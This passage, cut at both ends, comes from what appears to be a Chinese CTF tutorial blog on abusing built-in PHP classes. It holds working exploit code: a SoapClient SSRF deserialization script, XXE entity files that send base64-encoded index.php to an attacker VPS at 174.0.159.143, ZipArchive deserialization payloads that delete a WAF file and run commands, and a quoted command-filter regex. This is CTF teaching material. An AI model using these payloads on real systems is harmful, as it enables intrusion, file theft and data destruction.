class="string">'f'</span>=&gt;<span class="string">'extract'</span>);</span><br><span class="line"><span class="variable">$_POST</span> = array(<span class="string">'b'</span>=&gt;<span class="string">'call_user_func'</span>);</span><br></pre></td></tr></table></figure><p>exp</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import re</span><br><span class="line">url = <span class="string">"http://27fd9428-ccac-4c07-b6a7-8367586baea1.node3.buuoj.cn/"</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">'|O:10:"SoapClient":3:&#123;s:3:"uri";s:3:"123";s:8:"location";s:25:"http://127.0.0.1/flag.php";s:13:"_soap_version";i:1;&#125;'</span></span><br><span class="line"></span><br><span class="line">r = requests.session()</span><br><span class="line">data = &#123;<span class="string">'serialize_handler'</span> : <span class="string">'php_serialize'</span>&#125;</span><br><span class="line">url1 = url+<span class="string">"?f=session_start&amp;name="</span>+payload</span><br><span class="line">html = r.post(url1, data=data).text</span><br><span class="line"></span><br><span class="line">data = &#123;<span class="string">'b'</span> : <span class="string">"call_user_func"</span>&#125;</span><br><span class="line">url2 = url+<span class="string">"?f=extract&amp;name="</span>+payload</span><br><span class="line">html = r.post(url2, data=data).text</span><br><span class="line"></span><br><span class="line">data = &#123;<span class="string">'b'</span> : <span class="string">"var_dump"</span>&#125;</span><br><span class="line">url2 = url+<span class="string">"?f=extract&amp;name="</span>+payload</span><br><span class="line">html = r.post(url2, data=data).text</span><br><span class="line"></span><br><span class="line">rs = re.findall(r<span class="string">'string\(26\) "(.*?)"'</span>, html)</span><br><span class="line"></span><br><span class="line">url2 = url</span><br><span class="line">cookie = &#123;<span class="string">"Cookie"</span>:<span class="string">"PHPSESSID="</span>+rs[<span class="number">0</span>]&#125;</span><br><span class="line">html = r.post(url2,headers = cookie).text</span><br><span class="line"><span class="keyword">print</span> html</span><br></pre></td></tr></table></figure><h1 id="使用-SimpleXMLElement-类进行-XXE"><a href="#使用-SimpleXMLElement-类进行-XXE" class="headerlink" title="使用 SimpleXMLElement 类进行 XXE"></a>使用 SimpleXMLElement 类进行 XXE</h1><p>SimpleXMLElement 这个内置类用于解析 XML 文档中的元素。</p><p>SimpleXMLElement 类<br>官方文档中对于SimpleXMLElement 类的构造方法 <code>SimpleXMLElement::__construct</code> 的定义如下：</p><p><img src="../../images/php/primary/8.png" alt=""><br>可以看到通过设置第三个参数 data_is_url 为 true，我们可以实现远程xml文件的载入。第二个参数的常量值我们设置为2即可。第一个参数 data 就是我们自己设置的payload的url地址，即用于引入的外部实体的url。</p><p>这样的话，当我们可以控制目标调用的类的时候，便可以通过 SimpleXMLElement 这个内置类来构造 XXE。  </p><h2 id="SUCTF-2018-Homework"><a href="#SUCTF-2018-Homework" class="headerlink" title="[SUCTF 2018]Homework"></a>[SUCTF 2018]Homework</h2><p>进入题目，随便注册一个账号，登录作业平台。看到一个 calc 计算器类的代码。有两个按钮，一个用于调用 calc 类实现两位数的四则运算。另一个用于上传文件，提交代码。 </p><p>calc计算机类代码为： </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">calc</span></span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__construct__</span><span class="params">()</span></span>&#123;</span><br><span class="line">calc();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">calc</span><span class="params">($args1,$method,$args2)</span></span>&#123;</span><br><span class="line">$args1=intval($args1);</span><br><span class="line">$args2=intval($args2);</span><br><span class="line"><span class="keyword">switch</span> ($method) &#123;</span><br><span class="line"><span class="keyword">case</span> <span class="string">'a'</span>:</span><br><span class="line">$method=<span class="string">"+"</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">case</span> <span class="string">'b'</span>:</span><br><span class="line">$method=<span class="string">"-"</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">case</span> <span class="string">'c'</span>:</span><br><span class="line">$method=<span class="string">"*"</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">case</span> <span class="string">'d'</span>:</span><br><span class="line">$method=<span class="string">"/"</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line"><span class="keyword">die</span>(<span class="string">"invalid input"</span>);</span><br><span class="line">&#125;</span><br><span class="line">$Expression=$args1.$method.$args2;</span><br><span class="line"><span class="keyword">eval</span>(<span class="string">"\$r=$Expression;"</span>);</span><br><span class="line"><span class="keyword">die</span>(<span class="string">"Calculation results:"</span>.$r);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>所以我们可以通过这种形式调用PHP中的内置类。这里我们通过调用 SimpleXMLElement 这个内置类来构造 XXE。</p><p>首先，我们在vps（xxx.xxx.xxx.xxx）上构造如下evil.xml、send.xml和send.php这三个文件。  </p><p>构造的xml如下</p><p>obj.xml</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">try</span>[</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">int</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"http://174.0.159.143/e.xml"</span>&gt;</span></span></span><br><span class="line"><span class="meta">%int;</span></span><br><span class="line"><span class="meta">%all;</span></span><br><span class="line"><span class="meta">%send;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br></pre></td></tr></table></figure><p>e.xml</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">payl</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"php://filter/read=convert.base64-encode/resource=index.php"</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">all</span> <span class="meta-string">"&lt;!ENTITY &amp;#37; send SYSTEM 'http://174.0.159.143/?%payl;'&gt;"</span>&gt;</span></span><br></pre></td></tr></table></figure><p>然后进入show.php页面~~我们的参数为：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/show.php?module=SimpleXMLElement&amp;args[]=http://174.0.159.143/obj.xml&amp;args[]=2&amp;args[]=<span class="literal">true</span></span><br></pre></td></tr></table></figure><p>第一个参数为我们obj.xml的地址，这样就能加载obj.xml，再加载e.xml，网站的源码带出。</p><p><img src="../../images/php/primary/9.png" alt=""><br>后续……  </p><h1 id="使用-ZipArchive-类来删除文件"><a href="#使用-ZipArchive-类来删除文件" class="headerlink" title="使用 ZipArchive 类来删除文件"></a>使用 ZipArchive 类来删除文件</h1><h2 id="ZipArchive-类"><a href="#ZipArchive-类" class="headerlink" title="ZipArchive 类"></a>ZipArchive 类</h2><p>PHP ZipArchive类是PHP的一个原生类，它是在PHP 5.20之后引入的。ZipArchive类可以对文件进行压缩与解压缩处理。</p><p>下面列举几个常见的类方法：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">ZipArchive::addEmptyDir：添加一个新的文件目录</span><br><span class="line">ZipArchive::addFile：将文件添加到指定zip压缩包中</span><br><span class="line">ZipArchive::addFromString：添加新的文件同时将内容添加进去</span><br><span class="line">ZipArchive::close：关闭ziparchive</span><br><span class="line">ZipArchive::extractTo：将压缩包解压</span><br><span class="line">ZipArchive::open：打开一个zip压缩包</span><br><span class="line">ZipArchive::deleteIndex：删除压缩包中的某一个文件，如：deleteIndex(0)代表删除第一个文件</span><br><span class="line">ZipArchive::deleteName：删除压缩包中的某一个文件名称，同时也将文件删除</span><br><span class="line">……</span><br></pre></td></tr></table></figure><p>我们来重点看看 ZipArchive::open 方法：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ZipArchive::open(string <span class="variable">$filename</span>, int <span class="variable">$flags</span>=0)</span><br></pre></td></tr></table></figure><p>该方法用来打开一个新的或现有的zip存档以进行读取，写入或修改。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">filename：要打开的ZIP存档的文件名。</span><br><span class="line">flags：用于打开档案的模式。有以下几种模式：</span><br><span class="line">ZipArchive::OVERWRITE：总是以一个新的压缩包开始，此模式下如果已经存在则会被覆盖或删除。</span><br><span class="line">ZipArchive::CREATE：如果不存在则创建一个zip压缩包。</span><br><span class="line">ZipArchive::RDONLY：只读模式打开压缩包。</span><br><span class="line">ZipArchive::EXCL：如果压缩包已经存在，则出错。</span><br><span class="line">ZipArchive::CHECKCONS：对压缩包执行额外的一致性检查，如果失败则显示错误。</span><br></pre></td></tr></table></figure><p>注意，如果设置flags参数的值为 ZipArchive::OVERWRITE 的话，可以把指定文件删除。这里我们跟进方法可以看到const OVERWRITE = 8，也就是将OVERWRITE定义为了常量8，我们在调用时也可以直接将flags赋值为8。</p><p>也就是说我们可以利用ZipArchive原生类调用open方法删除目标主机上的文件。下面我们来看一道CTF题目。</p><h2 id="梦里花开牡丹亭"><a href="#梦里花开牡丹亭" class="headerlink" title="梦里花开牡丹亭"></a>梦里花开牡丹亭</h2><p>可看此题：<a href="https://blog.csdn.net/jvkyvly/article/details/115052002" target="_blank" rel="noopener">https://blog.csdn.net/jvkyvly/article/details/115052002</a></p><p>进入题目，给出源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">'shell.php'</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Game</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span>  $username;</span><br><span class="line">    <span class="keyword">public</span>  $password;</span><br><span class="line">    <span class="keyword">public</span>  $choice;</span><br><span class="line">    <span class="keyword">public</span>  $register;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span>  $file;</span><br><span class="line">    <span class="keyword">public</span>  $filename;</span><br><span class="line">    <span class="keyword">public</span>  $content;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username=<span class="string">'user'</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password=<span class="string">'user'</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(md5(<span class="keyword">$this</span>-&gt;register)===<span class="string">"21232f297a57a5a743894a0e4a801fc3"</span>)&#123;    <span class="comment">// admin</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;choice=<span class="keyword">new</span> login(<span class="keyword">$this</span>-&gt;file,<span class="keyword">$this</span>-&gt;filename,<span class="keyword">$this</span>-&gt;content);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;choice = <span class="keyword">new</span> register();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;choice-&gt;checking(<span class="keyword">$this</span>-&gt;username,<span class="keyword">$this</span>-&gt;password);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">login</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $file;</span><br><span class="line">    <span class="keyword">public</span> $filename;</span><br><span class="line">    <span class="keyword">public</span> $content;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($file,$filename,$content)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;file=$file;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;filename=$filename;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;content=$content;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">checking</span><span class="params">($username,$password)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>($username===<span class="string">'admin'</span>&amp;&amp;$password===<span class="string">'admin'</span>)&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;file-&gt;open(<span class="keyword">$this</span>-&gt;filename,<span class="keyword">$this</span>-&gt;content);</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'login success you can to open shell file!'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">register</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">checking</span><span class="params">($username,$password)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>($username===<span class="string">'admin'</span>&amp;&amp;$password===<span class="string">'admin'</span>)&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'success register admin'</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'please register admin '</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Open</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">open</span><span class="params">($filename, $content)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!file_get_contents(<span class="string">'waf.txt'</span>))&#123;    <span class="comment">// 当waf.txt没读取成功时才能得到flag</span></span><br><span class="line">            shell($content);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> file_get_contents($filename.<span class="string">".php"</span>);    <span class="comment">// filename=php://filter/read=convert.base64-encode/resource=shell</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>($_GET[<span class="string">'a'</span>]!==$_GET[<span class="string">'b'</span>]&amp;&amp;(md5($_GET[<span class="string">'a'</span>]) === md5($_GET[<span class="string">'b'</span>])) &amp;&amp; (sha1($_GET[<span class="string">'a'</span>])=== sha1($_GET[<span class="string">'b'</span>])))&#123;</span><br><span class="line">    @unserialize(base64_decode($_POST[<span class="string">'unser'</span>]));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>开头包含了shell.php，我们可以构造反序列化POC来读取shell.php：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Game</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span>  $username=<span class="string">"admin"</span>;</span><br><span class="line">    <span class="keyword">public</span>  $password=<span class="string">"admin"</span>;</span><br><span class="line">    <span class="keyword">public</span>  $choice=<span class="string">"xxx"</span>;</span><br><span class="line">    <span class="keyword">public</span>  $register=<span class="string">"admin"</span>;</span><br><span class="line">    <span class="keyword">public</span>  $file;</span><br><span class="line">    <span class="keyword">public</span>  $filename=<span class="string">"php://filter/read=convert.base64-encode/resource=shell"</span>;</span><br><span class="line">    <span class="keyword">public</span>  $content=<span class="string">"xxx"</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Open</span></span></span><br><span class="line"><span class="class"></span>&#123;&#125;</span><br><span class="line">$game=<span class="keyword">new</span> Game();</span><br><span class="line">$game-&gt;file=<span class="keyword">new</span> Open();</span><br><span class="line"><span class="keyword">echo</span> base64_encode(serialize($game));</span><br></pre></td></tr></table></figure><p>执行payload读取到shell.php的源码base64编码,解密得到<br>shell.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">shell</span><span class="params">($cmd)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(strlen($cmd)&lt;<span class="number">10</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">'/cat|tac|more|less|head|tail|nl|tail|sort|od|base|awk|cut|grep|uniq|string|sed|rev|zip|\*|\?/'</span>,$cmd))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"NO"</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> system($cmd);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'so long!'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可知我们只要使 file_get_contents(‘waf.txt’) 读取失败就可以进入 shell($content) 来执行系统命令。所以我们应该要想办法将waf.txt这个文件删除，这样就会读取失败，才能执行我们的命令。</p><p>要删除waf.txt只能想到原生类了，并且这个原生类中要有一个open()方法。遍历一下能有删除功能函数：  </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$classes = get_declared_classes();</span><br><span class="line"><span class="keyword">foreach</span> ($classes <span class="keyword">as</span> $class) &#123;</span><br><span class="line">    $methods = get_class_methods($class);</span><br><span class="line">    <span class="keyword">foreach</span> ($methods <span class="keyword">as</span> $method) &#123;</span><br><span class="line">        <span class="keyword">if</span> (in_array($method, <span class="keyword">array</span>(</span><br><span class="line">            <span class="string">'__destruct'</span>,</span><br><span class="line">            <span class="string">'__wakeup'</span>,</span><br><span class="line">            <span class="string">'__call'</span>,</span><br><span class="line">            <span class="string">'__callStatic'</span>,</span><br><span class="line">            <span class="string">'open'</span></span><br><span class="line">        ))) &#123;</span><br><span class="line">            <span class="keyword">print</span> $class . <span class="string">'::'</span> . $method . <span class="string">"\n"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>找到了一个ZipArchive类，其中刚好有一个open()方法刚好符合：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ZipArchive::open($filename, $flags &#x3D; null)</span><br></pre></td></tr></table></figure><p>如果设置flags参数的值为 ZipArchive::OVERWRITE 的话，可以把指定文件删除。这里我们跟进方法可以看到const OVERWRITE = 8，也就是将OVERWRITE定义为了常量8，我们在调用时也可以直接将flags赋值为8。</p><p>所以我们利用ZipArchive原生类调用open方法，即可将即可将$filename（waf.txt）删除：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ZipArchive::open(<span class="variable">$filename</span>, ZipArchive::OVERWRITE)</span><br></pre></td></tr></table></figure><p>删除waf.txt的poc</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Game</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span>  $username=<span class="string">"admin"</span>;</span><br><span class="line">    <span class="keyword">public</span>  $password=<span class="string">"admin"</span>;</span><br><span class="line">    <span class="keyword">public</span>  $choice=<span class="string">"xxx"</span>;</span><br><span class="line">    <span class="keyword">public</span>  $register=<span class="string">"admin"</span>;</span><br><span class="line">    <span class="keyword">public</span>  $file;</span><br><span class="line">    <span class="keyword">public</span>  $filename;</span><br><span class="line">    <span class="keyword">public</span>  $content;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Open</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">&#125;</span><br><span class="line">$game=<span class="keyword">new</span> Game();</span><br><span class="line">$game-&gt;file=<span class="keyword">new</span> ZipArchive();</span><br><span class="line">$game-&gt;content=ZipArchive::OVERWRITE;</span><br><span class="line">$game-&gt;filename=<span class="string">"waf.txt"</span>;</span><br><span class="line"><span class="keyword">echo</span> base64_encode(serialize($game));</span><br></pre></td></tr></table></figure><p>执行后，即可删除waf.txt。接下来就可以使用 n\l /flag 执行命令读取flag了：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Game</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span>  $username=<span class="string">"admin"</span>;</span><br><span class="line">    <span class="keyword">public</span>  $password=<span class="string">"admin"</span>;</span><br><span class="line">    <span class="keyword">public</span>  $choice=<span class="string">"xxx"</span>;</span><br><span class="line">    <span class="keyword">public</span>  $register=<span class="string">"admin"</span>;</span><br><span class="line">    <span class="keyword">public</span>  $file;</span><br><span class="line">    <span class="keyword">public</span>  $filename;</span><br><span class="line">    <span class="keyword">public</span>  $content;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Open</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">&#125;</span><br><span class="line">$game=<span class="keyword">new</span> Game();</span><br><span class="line">$game-&gt;file=<span class="keyword">new</span> Open();</span><br><span class="line">$game-&gt;content=<span class="string">" n\l /flag "</span>;</span><br><span class="line">$game-&gt;filename=<span class="string">"xxx"</span>;</span><br><span class="line"><span class="keyword">echo</span> base64_encode(serialize($game));</span><br></pre></td></tr></table></figure><h1 id="PHP-原生文件操作类"><a href="#PHP-原生文件操作类" class="headerlink" title="PHP 原生文件操作类"></a>PHP 原生文件操作类</h1><h2 id="SPL"><a href="#SPL" class="headerlink" title="SPL"></a>SPL</h2><p>SPL就是Standard PHP Library的缩写。据手册显示，SPL是用于解决 典型问题(standard problems) 的一组接口与类的集合：  </p><p>SPL 对 PHP 引擎进行了扩展，例如 ArrayAccess、Countable 和 SeekableIterator 等接口，它们用于以数组形式操作对象。同时，你还可以使用 RecursiveIterator、ArrayObejcts 等其他迭代器进行数据的迭代操作。它还内置几个的对象例如 Exceptions、SplObserver、Spltorage 以及 splautoloadregister、splclasses、iteratorapply 等的帮助函数（helper functions），用于重载对应的功能。这些工具聚合在一起就好比是把多功能的瑞士军刀，善用它们可以从质上提升 PHP 的代码效率。</p><p>因为SPL是要解决典型问题，免不了有一些处理文件的类。下面，我们简单的挑几个SPL中常用的文件处理原生类进行讲解，其他的等以后遇到了在添进来。</p><h2 id="可遍历目录类"><a href="#可遍历目录类" class="headerlink" title="可遍历目录类"></a>可遍历目录类</h2><p>可遍历目录类有以下几个：</p><ul><li>DirectoryIterator 类</li><li>FilesystemIterator 类</li><li>GlobIterator 类</li></ul><p><strong>DirectoryIterator 类</strong>   </p><p>DirectoryIterator 类提供了一个用于查看文件系统目录内容的简单接口。该类的构造方法将会创建一个指定目录的迭代器。 </p><p>类摘要：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span 